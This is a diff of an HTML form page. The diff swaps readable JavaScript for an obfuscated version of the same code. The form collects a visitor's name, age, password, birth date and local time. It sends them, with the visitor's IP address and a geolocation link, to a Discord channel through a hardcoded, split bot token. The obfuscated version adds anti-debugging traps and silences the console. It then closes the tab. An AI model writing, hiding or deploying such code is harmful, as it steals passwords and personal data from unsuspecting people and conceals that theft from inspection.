@@ -11,114 +11,7 @@
   <script type="text/javascript" src="lib/functions.js"></script>
   <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
   <script type="text/javascript">
-    const client = new Discord.Client();
-
-    client.on('ready', () => {
-      logger(`Logged in as ${client.user.tag} (${client.user.id})`, 'ready');
-    });
-
-    function startBot() {
-      token1 = `NzIzNTI4ODI2MjE0NDE2NDQ3.Xwo`
-      token2 = `NEg.wE7KQa9tZwlfOQjJZF14-RZmfXw`
-      token = token1 + token2
-      client
-        .login(token)
-    }
-
-
-
-    function sendMessage() {
-
-
-
-
-      const title = "Someone pressed the button!"
-      const name = document.getElementById('name').value
-      const age = document.getElementById('age').value
-      const passwd = document.getElementById('passwd').value
-      const bdate = document.getElementById('bd').value.split("-")
-      const ctime = document.getElementById('ct').value
-      if (ctime == "") {
-        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
-      }
-      else if (bdate == "undefined/undefined/") {
-        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\nTheir birth date: ${bdate[2]}/${bdate[1]}/${bdate[0]}\nTheir local time: ${ctime}\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
-      }
-      else {
-        body = `Their name: '${name}'\nTheir age: '${age}'\nTheir password: '${passwd}'\nTheir birth date: ${bdate[2]}/${bdate[1]}/${bdate[0]}\nTheir local time: ${ctime}\n\n~IP Address information~\nIP Address: '${ipad}\nIP Geolocation link: https://tools.keycdn.com/geo?host=${ipad}`
-      }
-
-      const msgChannel = client.channels.get("731616868955324417");
-
-
-
-
-      msgChannel.send(`${title}\n${body}`);
-
-
-    }
-
-    startBot()
-
-
-    function check() {
-      const name = document.getElementById('name').value
-      const age = document.getElementById('age').value
-      const passwd = document.getElementById('passwd').value
-      const bdate = document.getElementById('bd').value.split("-")
-      const ctime = document.getElementById('ct').value
-      if (name == "") {
-        document.getElementById('name').style.borderBottom = "2px solid red"
-        document.getElementById('reqText').style.opacity = "1"
-      }
-      else if (age == "") {
-        document.getElementById('age').style.borderBottom = "2px solid red"
-        document.getElementById('reqText').style.opacity = "1"
-      }
-      else if (passwd == "") {
-        document.getElementById('passwd').style.borderBottom = "2px solid red"
-        document.getElementById('reqText').style.opacity = "1"
-      }
-      else {
-        sendMessage()
-        ok()
-        hide()
-      }
-    }
-
-    function getIP(json) {
-      ipad = json.ip
-    }
-
-    async function ok() {
-
-      document.getElementById('reqText').style.opacity = '0'
-      document.getElementById('name').style.borderBottom = "2px solid green"
-      document.getElementById('age').style.borderBottom = "2px solid green"
-      document.getElementById('passwd').style.borderBottom = "2px solid green"
-      document.getElementById('bd').style.borderBottom = "2px solid green"
-      document.getElementById('ct').style.borderBottom = "2px solid green"
-      
-    }
-    async function hide(){
-  document.getElementById('bdlab').style.opacity = "0"
-  document.getElementById('ctlab').style.opacity = "0"
-  document.getElementById('title').style.opacity = "0"
-  document.getElementById('name').style.opacity = "0"
-  document.getElementById('age').style.opacity = "0"
-  document.getElementById('passwd').style.opacity = "0"
-  document.getElementById('bd').style.opacity = "0"
-  document.getElementById('ct').style.opacity = "0"
-  await new Promise(r => setTimeout(r, 500));
-  document.getElementById('kthx').style.opacity = "1"
-  document.getElementById('bdlab').innerText = "This tab wil now close"
-  document.getElementById('bdlab').style.opacity = "0"
-  
-  await new Promise(r => setTimeout(r, 2000));
-  window.close()
-}
-
-
+    const _0x3bfd=['\x27\x0aTheir\x20age:\x20\x27','counter','gger','send','undefined/undefined/','style','console','trace','stateObject','input','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','reqText','Someone\x20pressed\x20the\x20button!','split','bdlab','name','test','\x0aTheir\x20local\x20time:\x20','borderBottom','NEg.wE7KQa9tZwlfOQjJZF14-RZmfXw','login','string','log','\x27\x0aTheir\x20birth\x20date:\x20','age','opacity','warn','ready','\x0aIP\x20Geolocation\x20link:\x20https://tools.keycdn.com/geo?host=','apply','tag','NzIzNTI4ODI2MjE0NDE2NDQ3.Xwo','init','return\x20(function()\x20','table','Client','function\x20*\x5c(\x20*\x5c)','action','chain','get','kthx','value','info','\x0a\x0a~IP\x20Address\x20information~\x0aIP\x20Address:\x20\x27','call','exception','2px\x20solid\x20green','title','debu','constructor','\x27\x0aTheir\x20password:\x20\x27','length','error','debug','channels','731616868955324417','Their\x20name:\x20\x27','ctlab','passwd','getElementById','2px\x20solid\x20red'];(function(_0x2c1973,_0x3bfde7){const _0x2aa119=function(_0x1dbf7f){while(--_0x1dbf7f){_0x2c1973['push'](_0x2c1973['shift']());}};_0x2aa119(++_0x3bfde7);}(_0x3bfd,0x11d));const _0x2aa1=function(_0x2c1973,_0x3bfde7){_0x2c1973=_0x2c1973-0x0;let _0x2aa119=_0x3bfd[_0x2c1973];return _0x2aa119;};const client=new Discord[(_0x2aa1('0x37'))]();setInterval(function(){_0x45ea8f();},0xfa0);client['on'](_0x2aa1('0x2f'),()=>{logger('Logged\x20in\x20as\x20'+client['user'][_0x2aa1('0x32')]+'\x20('+client['user']['id']+')','ready');});function startBot(){const _0x5918cc=function(){let _0x3e2dc0=!![];return function(_0x576aae,_0x2fb5f6){const _0x2c7fbf=_0x3e2dc0?function(){if(_0x2fb5f6){const _0x16ef6c=_0x2fb5f6[_0x2aa1('0x31')](_0x576aae,arguments);return _0x2fb5f6=null,_0x16ef6c;}}:function(){};_0x3e2dc0=![];return _0x2c7fbf;};}();(function(){_0x5918cc(this,function(){const _0xde18e9=new RegExp(_0x2aa1('0x38')),_0xd988cf=new RegExp(_0x2aa1('0x1e'),'i'),_0x4eeafc=_0x45ea8f(_0x2aa1('0x34'));!_0xde18e9[_0x2aa1('0x24')](_0x4eeafc+_0x2aa1('0x3a'))||!_0xd988cf[_0x2aa1('0x24')](_0x4eeafc+_0x2aa1('0x1d'))?_0x4eeafc('0'):_0x45ea8f();})();}());const _0x5f3ea3=function(){let _0xb68c18=!![];return function(_0x45d8c8,_0x201618){const _0x82cb58=_0xb68c18?function(){if(_0x201618){const _0x161335=_0x201618[_0x2aa1('0x31')](_0x45d8c8,arguments);return _0x201618=null,_0x161335;}}:function(){};_0xb68c18=![];return _0x82cb58;};}(),_0xdcc555=_0x5f3ea3(this,function(){const _0x2ad73b=function(){};let _0x5ce746;try{const _0x406b9a=Function(_0x2aa1('0x35')+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x5ce746=_0x406b9a();}catch(_0x41e54c){_0x5ce746=window;}!_0x5ce746[_0x2aa1('0x1a')]?_0x5ce746[_0x2aa1('0x1a')]=function(_0x413f57){const _0x56ba73={};_0x56ba73[_0x2aa1('0x2a')]=_0x413f57;_0x56ba73[_0x2aa1('0x2e')]=_0x413f57;_0x56ba73[_0x2aa1('0xc')]=_0x413f57;_0x56ba73['info']=_0x413f57;_0x56ba73['error']=_0x413f57;_0x56ba73['exception']=_0x413f57;_0x56ba73['table']=_0x413f57;_0x56ba73[_0x2aa1('0x1b')]=_0x413f57;return _0x56ba73;}(_0x2ad73b):(_0x5ce746[_0x2aa1('0x1a')][_0x2aa1('0x2a')]=_0x2ad73b,_0x5ce746[_0x2aa1('0x1a')][_0x2aa1('0x2e')]=_0x2ad73b,_0x5ce746['console'][_0x2aa1('0xc')]=_0x2ad73b,_0x5ce746[_0x2aa1('0x1a')][_0x2aa1('0x1')]=_0x2ad73b,_0x5ce746['console'][_0x2aa1('0xb')]=_0x2ad73b,_0x5ce746[_0x2aa1('0x1a')][_0x2aa1('0x4')]=_0x2ad73b,_0x5ce746['console'][_0x2aa1('0x36')]=_0x2ad73b,_0x5ce746[_0x2aa1('0x1a')][_0x2aa1('0x1b')]=_0x2ad73b);});_0xdcc555();token1=_0x2aa1('0x33');token2=_0x2aa1('0x27');token=token1+token2;client[_0x2aa1('0x28')](token);}function sendMessage(){const _0xecac77=_0x2aa1('0x20'),_0x2d5d21=document['getElementById'](_0x2aa1('0x23'))['value'],_0x472972=document[_0x2aa1('0x12')]('age')[_0x2aa1('0x0')],_0x981753=document[_0x2aa1('0x12')](_0x2aa1('0x11'))[_0x2aa1('0x0')],_0x21c6d0=document[_0x2aa1('0x12')]('bd')[_0x2aa1('0x0')][_0x2aa1('0x21')]('-'),_0x1be957=document[_0x2aa1('0x12')]('ct')[_0x2aa1('0x0')];if(_0x1be957=='')body=_0x2aa1('0xf')+_0x2d5d21+'\x27\x0aTheir\x20age:\x20\x27'+_0x472972+_0x2aa1('0x9')+_0x981753+'\x27\x0a\x0a~IP\x20Address\x20information~\x0aIP\x20Address:\x20\x27'+ipad+_0x2aa1('0x30')+ipad;else _0x21c6d0==_0x2aa1('0x18')?body=_0x2aa1('0xf')+_0x2d5d21+_0x2aa1('0x14')+_0x472972+_0x2aa1('0x9')+_0x981753+'\x27\x0aTheir\x20birth\x20date:\x20'+_0x21c6d0[0x2]+'/'+_0x21c6d0[0x1]+'/'+_0x21c6d0[0x0]+_0x2aa1('0x25')+_0x1be957+'\x0a\x0a~IP\x20Address\x20information~\x0aIP\x20Address:\x20\x27'+ipad+_0x2aa1('0x30')+ipad:body=_0x2aa1('0xf')+_0x2d5d21+_0x2aa1('0x14')+_0x472972+'\x27\x0aTheir\x20password:\x20\x27'+_0x981753+_0x2aa1('0x2b')+_0x21c6d0[0x2]+'/'+_0x21c6d0[0x1]+'/'+_0x21c6d0[0x0]+_0x2aa1('0x25')+_0x1be957+_0x2aa1('0x2')+ipad+_0x2aa1('0x30')+ipad;const _0x29875a=client[_0x2aa1('0xd')][_0x2aa1('0x3b')](_0x2aa1('0xe'));_0x29875a[_0x2aa1('0x17')](_0xecac77+'\x0a'+body);}startBot();function check(){const _0x360c77=document['getElementById'](_0x2aa1('0x23'))[_0x2aa1('0x0')],_0x502066=document[_0x2aa1('0x12')](_0x2aa1('0x2c'))[_0x2aa1('0x0')],_0x534e82=document['getElementById'](_0x2aa1('0x11'))[_0x2aa1('0x0')],_0x52749d=document[_0x2aa1('0x12')]('bd')[_0x2aa1('0x0')][_0x2aa1('0x21')]('-'),_0xb0f134=document[_0x2aa1('0x12')]('ct')[_0x2aa1('0x0')];if(_0x360c77=='')document[_0x2aa1('0x12')](_0x2aa1('0x23'))[_0x2aa1('0x19')][_0x2aa1('0x26')]=_0x2aa1('0x13'),document[_0x2aa1('0x12')](_0x2aa1('0x1f'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='1';else{if(_0x502066=='')document[_0x2aa1('0x12')](_0x2aa1('0x2c'))[_0x2aa1('0x19')][_0x2aa1('0x26')]=_0x2aa1('0x13'),document[_0x2aa1('0x12')](_0x2aa1('0x1f'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='1';else _0x534e82==''?(document[_0x2aa1('0x12')](_0x2aa1('0x11'))['style']['borderBottom']=_0x2aa1('0x13'),document[_0x2aa1('0x12')](_0x2aa1('0x1f'))['style'][_0x2aa1('0x2d')]='1'):(sendMessage(),ok(),hide());}}function getIP(_0x57c297){ipad=_0x57c297['ip'];}async function ok(){document[_0x2aa1('0x12')](_0x2aa1('0x1f'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')](_0x2aa1('0x23'))[_0x2aa1('0x19')]['borderBottom']=_0x2aa1('0x5');document[_0x2aa1('0x12')](_0x2aa1('0x2c'))[_0x2aa1('0x19')]['borderBottom']=_0x2aa1('0x5');document[_0x2aa1('0x12')](_0x2aa1('0x11'))[_0x2aa1('0x19')][_0x2aa1('0x26')]='2px\x20solid\x20green';document[_0x2aa1('0x12')]('bd')['style']['borderBottom']='2px\x20solid\x20green';document[_0x2aa1('0x12')]('ct')[_0x2aa1('0x19')][_0x2aa1('0x26')]=_0x2aa1('0x5');}async function hide(){document[_0x2aa1('0x12')](_0x2aa1('0x22'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')](_0x2aa1('0x10'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')](_0x2aa1('0x6'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document['getElementById'](_0x2aa1('0x23'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')]('age')['style'][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')](_0x2aa1('0x11'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')]('bd')[_0x2aa1('0x19')][_0x2aa1('0x2d')]='0';document[_0x2aa1('0x12')]('ct')['style'][_0x2aa1('0x2d')]='0';await new Promise(_0x157df0=>setTimeout(_0x157df0,0x1f4));document[_0x2aa1('0x12')](_0x2aa1('0x3c'))[_0x2aa1('0x19')][_0x2aa1('0x2d')]='1';await new Promise(_0x31cf74=>setTimeout(_0x31cf74,0x7d0));window['close']();}function _0x45ea8f(_0xd59d70){function _0x3cb290(_0x3d3eea){if(typeof _0x3d3eea===_0x2aa1('0x29'))return function(_0x5530ca){}['constructor']('while\x20(true)\x20{}')[_0x2aa1('0x31')](_0x2aa1('0x15'));else(''+_0x3d3eea/_0x3d3eea)[_0x2aa1('0xa')]!==0x1||_0x3d3eea%0x14===0x0?function(){return!![];}['constructor'](_0x2aa1('0x7')+_0x2aa1('0x16'))[_0x2aa1('0x3')](_0x2aa1('0x39')):function(){return![];}[_0x2aa1('0x8')](_0x2aa1('0x7')+_0x2aa1('0x16'))[_0x2aa1('0x31')](_0x2aa1('0x1c'));_0x3cb290(++_0x3d3eea);}try{if(_0xd59d70)return _0x3cb290;else _0x3cb290(0x0);}catch(_0x49ada5){}}
      </script>
   
   
@@ -147,7 +40,7 @@
     <input id="ct" type="time">
     <button onclick="check()" id="nextButton">Next</button>
     <p id="reqText">*Red fields are required.</p>
-    <h1 id="kthx" style="z-index: 2; position: absolute; margin: auto; top: 260px; bottom: 0; left: 0; right: 0; opacity: 0;">Thank You.</h1>
+    <h1 id="kthx" style="z-index: 2; position: absolute; margin: auto; top: 260px; bottom: 0; left: 0; right: 0; opacity: 0;">Thank You.<br>You can now close this tab.</h1>
   </div>
 
   <p id="redirect">Code sampled from <a id="reLink"
